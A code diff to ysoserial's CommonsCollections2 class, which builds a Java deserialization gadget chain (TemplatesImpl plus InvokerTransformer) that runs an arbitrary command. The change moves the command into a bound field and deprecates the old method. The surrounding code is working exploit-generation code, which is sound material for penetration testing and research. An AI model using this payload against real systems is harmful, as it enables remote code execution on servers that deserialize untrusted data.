@@ -6,6 +6,8 @@ import java.util.Queue;
 import org.apache.commons.collections4.comparators.TransformingComparator;
 import org.apache.commons.collections4.functors.InvokerTransformer;
 
+import ysoserial.annotation.Bind;
+import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
@@ -27,7 +29,16 @@ import ysoserial.payloads.util.Reflections;
 @Dependencies({"org.apache.commons:commons-collections4:4.0"})
 public class CommonsCollections2 implements ObjectPayload<Queue<Object>> {
 
+	@Bind private String command;
+	
+	/**
+	 * @deprecated Use {@link #getObject()} instead
+	 */
 	public Queue<Object> getObject(final String command) throws Exception {
+		return getObject();
+	}
+
+	public Queue<Object> getObject() throws Exception {
 		final Object templates = Gadgets.createTemplatesImpl(command);
 		// mock method name until armed
 		final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
